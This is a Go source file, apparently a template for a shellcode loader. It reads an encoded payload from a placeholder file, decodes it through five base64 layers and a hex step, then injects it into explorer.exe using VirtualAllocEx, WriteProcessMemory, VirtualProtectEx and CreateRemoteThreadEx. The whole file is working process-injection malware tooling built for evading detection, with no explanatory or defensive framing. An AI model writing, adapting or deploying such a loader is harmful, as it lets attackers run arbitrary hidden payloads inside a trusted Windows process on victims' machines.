package pidthread

import (
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"unsafe"
)

func Readcode() string {
	f, err := ioutil.ReadFile("__SHELLCODE__")
	if err != nil {
		fmt.Println("read fail", err)
	}
	return string(f)
}
func Base64DecodeString(str string) string {
	resBytes, _ := base64.StdEncoding.DecodeString(str)
	return string(resBytes)
}

func main() {
	var code = Readcode()
	for i := 0; i < 5; i++ {
		code = Base64DecodeString(code)
	}
	shellcode, _ := hex.DecodeString(code)
	processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}
	kernel32 := windows.MustLoadDLL("kernel32.dll")
	VirtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.MustFindProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.MustFindProc("CreateRemoteThreadEx")
	pHandle, _ := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)
	addr, _, _ := VirtualAllocEx.Call(
		uintptr(pHandle),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
	)
	_, _, _ = WriteProcessMemory.Call(
		uintptr(pHandle),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(
		uintptr(pHandle),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	_, _, _ = CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	_ = windows.CloseHandle(pHandle)
}
